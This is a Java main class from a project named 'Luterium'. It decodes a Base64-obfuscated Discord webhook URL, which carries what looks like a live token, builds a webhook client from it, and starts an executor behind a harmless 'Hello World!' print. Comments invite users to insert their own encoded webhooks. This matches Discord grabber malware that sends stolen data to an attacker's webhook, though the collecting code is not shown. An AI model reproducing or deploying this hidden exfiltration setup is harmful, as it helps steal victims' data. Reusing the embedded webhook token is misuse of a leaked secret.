package dev.peter.luterium;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.WebhookClientBuilder;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Random;

/**
 @author Peter
 @since 08/14/2022
 **/

public class Main {
    //public String webhookName = "Luterium"; //Your webhook's name
    //public String avatarUrl = "https://bigrat.monster/media/bigrat.png"; //Your webhook's avatar URL

    public static Executor executor = new Executor(); //Object-oriented programming moment.

    public List<String> webhooksBase64 =
            Arrays.asList( //Put your Discord webhooks here (in Base64).
                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAwODc4Mzk3NzAzNDgxMzQ5MS9KWWlxeWZzRWpDczl5QlYzN3U4T2FYYkt6LTVhNHdKZXMzX2pZVy0zTmd0cGtTZlU0OHJOWnVvd1ZMMlV2RXl2cnRaMQ==",
                    "",
                    ""
            );
    final String convertWebhooks = new String(Base64.getDecoder().decode(webhooksBase64.get(new Random().nextInt(1)).getBytes(StandardCharsets.UTF_8)));

    public WebhookClientBuilder builder = new WebhookClientBuilder(convertWebhooks);
    public WebhookClient theThing = builder.build(); //This is the webhook basically.

    public static void main(String[] args) {
        System.out.println("Hello World!"); //Hi Intellij! Good to see you again! - Peter

        executor.execute(); //Execute the program.
    }
}